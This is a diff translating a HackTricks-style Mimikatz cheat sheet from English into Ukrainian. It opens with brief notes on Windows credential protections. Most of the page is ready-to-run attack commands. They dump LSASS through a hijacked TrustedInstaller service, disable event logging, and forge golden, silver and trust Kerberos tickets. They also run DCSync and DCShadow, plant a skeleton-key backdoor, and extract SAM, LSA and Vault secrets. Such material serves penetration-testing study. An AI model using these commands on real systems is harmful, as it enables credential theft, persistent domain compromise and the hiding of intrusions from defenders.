@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Поглибте свої знання в **Mobile Security** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**Ця сторінка базується на матеріалах з [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Перевірте оригінал для отримання додаткової інформації!
 
-## LM and Clear-Text in memory
+## LM та Clear-Text в пам'яті
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+З Windows 8.1 та Windows Server 2012 R2 впроваджено значні заходи для захисту від крадіжки облікових даних:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM хеші та паролі в чистому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Специфічне налаштування реєстру, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, повинно бути налаштоване з DWORD значенням `0`, щоб вимкнути Digest Authentication, забезпечуючи, що "паролі в чистому тексті" не кешуються в LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Protection** введено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам'яті та ін'єкції коду. Це досягається шляхом позначення LSASS як захищеного процесу. Активація LSA Protection передбачає:
+1. Модифікацію реєстру в _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
+2. Впровадження об'єкта групової політики (GPO), який забезпечує цю зміну реєстру на керованих пристроях.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Незважаючи на ці заходи, інструменти, такі як Mimikatz, можуть обійти LSA Protection, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.
 
-### Counteracting SeDebugPrivilege Removal
+### Протидія видаленню SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Адміністратори зазвичай мають SeDebugPrivilege, що дозволяє їм налагоджувати програми. Цю привілегію можна обмежити, щоб запобігти несанкціонованим дампам пам'яті, що є поширеною технікою, яку використовують зловмисники для витягування облікових даних з пам'яті. Однак, навіть з видаленою цією привілегією, обліковий запис TrustedInstaller все ще може виконувати дампи пам'яті, використовуючи налаштовану конфігурацію служби:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Це дозволяє скинути пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-
 ## Mimikatz Options
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+Зловживання журналами подій у Mimikatz включає дві основні дії: очищення журналів подій та патчинг служби подій, щоб запобігти реєстрації нових подій. Нижче наведені команди для виконання цих дій:
 
 #### Clearing Event Logs
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+- **Command**: Ця дія спрямована на видалення журналів подій, ускладнюючи відстеження злочинних дій.
+- Mimikatz не надає прямої команди у своїй стандартній документації для очищення журналів подій безпосередньо через командний рядок. Однак маніпуляції з журналами подій зазвичай включають використання системних інструментів або скриптів поза Mimikatz для очищення конкретних журналів (наприклад, використовуючи PowerShell або Windows Event Viewer).
 
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
+- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи їй реєструвати нові події.
 - Example: `mimikatz "privilege::debug" "event::drop" exit`
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+- Команда `privilege::debug` забезпечує, щоб Mimikatz працював з необхідними привілеями для зміни системних служб.
+- Команда `event::drop` потім патчить службу реєстрації подій.
 
 ### Kerberos Ticket Attacks
 
 ### Golden Ticket Creation
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+Золотий квиток дозволяє здійснювати доступ до домену під виглядом. Ключова команда та параметри:
 
 - Command: `kerberos::golden`
 - Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
+- `/domain`: Ім'я домену.
+- `/sid`: Ідентифікатор безпеки (SID) домену.
+- `/user`: Ім'я користувача, під виглядом якого потрібно діяти.
+- `/krbtgt`: NTLM хеш облікового запису служби KDC домену.
+- `/ptt`: Безпосередньо інжектує квиток у пам'ять.
+- `/ticket`: Зберігає квиток для подальшого використання.
 
 Example:
-
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Створення Срібного Квитка
 
-### Silver Ticket Creation
+Срібні Квитки надають доступ до конкретних сервісів. Ключова команда та параметри:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Команда: Схожа на Золотий Квиток, але націлена на конкретні сервіси.
+- Параметри:
+- `/service`: Сервіс, на який націлюються (наприклад, cifs, http).
+- Інші параметри схожі на Золотий Квиток.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Приклад:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Створення квитків довіри
 
-### Trust Ticket Creation
+Квитки довіри використовуються для доступу до ресурсів між доменами, використовуючи відносини довіри. Основна команда та параметри:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Команда: Схожа на Золотий Квиток, але для відносин довіри.
+- Параметри:
+- `/target`: Повне доменне ім'я цільового домену.
+- `/rc4`: NTLM хеш для облікового запису довіри.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Приклад:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### Додаткові команди Kerberos
 
-### Additional Kerberos Commands
+- **Список квитків**:
 
-- **Listing Tickets**:
+- Команда: `kerberos::list`
+- Перераховує всі квитки Kerberos для поточної сесії користувача.
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **Передати кеш**:
 
-- **Pass the Cache**:
+- Команда: `kerberos::ptc`
+- Впроваджує квитки Kerberos з кеш-файлів.
+- Приклад: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Передати квиток**:
 
-- **Pass the Ticket**:
+- Команда: `kerberos::ptt`
+- Дозволяє використовувати квиток Kerberos в іншій сесії.
+- Приклад: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **Очищення квитків**:
+- Команда: `kerberos::purge`
+- Очищає всі квитки Kerberos з сесії.
+- Корисно перед використанням команд маніпуляції квитками, щоб уникнути конфліктів.
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Підробка Active Directory
 
-### Active Directory Tampering
+- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляції об'єктами AD.
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync**: Імітувати DC для запиту даних паролів.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### Доступ до облікових даних
 
-### Credential Access
+- **LSADUMP::LSA**: Витягти облікові дані з LSA.
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync**: Імітувати DC, використовуючи дані паролів облікового запису комп'ютера.
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _У оригінальному контексті не надано конкретної команди для NetSync._
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM**: Доступ до локальної бази даних SAM.
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets**: Розшифрувати секрети, збережені в реєстрі.
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM**: Встановити новий NTLM хеш для користувача.
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust**: Отримати інформацію про аутентифікацію довіри.
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### Різне
 
-### Miscellaneous
+- **MISC::Skeleton**: Впровадити бекдор в LSASS на DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### Підвищення привілеїв
 
-### Privilege Escalation
+- **PRIVILEGE::Backup**: Отримати права на резервне копіювання.
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug**: Отримати привілеї налагодження.
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### Витягування облікових даних
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords**: Показати облікові дані для користувачів, які увійшли в систему.
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets**: Витягти квитки Kerberos з пам'яті.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### Маніпуляція SID та токенами
 
-### Sid and Token Manipulation
+- **SID::add/modify**: Змінити SID та SIDHistory.
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Змінити: _У оригінальному контексті не надано конкретної команди для зміни._
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate**: Імітувати токени.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### Служби терміналів
 
-### Terminal Services
+- **TS::MultiRDP**: Дозволити кілька RDP сесій.
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
+- **TS::Sessions**: Перерахувати сесії TS/RDP.
+- _У оригінальному контексті не надано конкретної команди для TS::Sessions._
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+### Сховище
 
-### Vault
-
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Витягти паролі з Windows Vault.
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Поглибте свої знання в **Мобільній безпеці** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
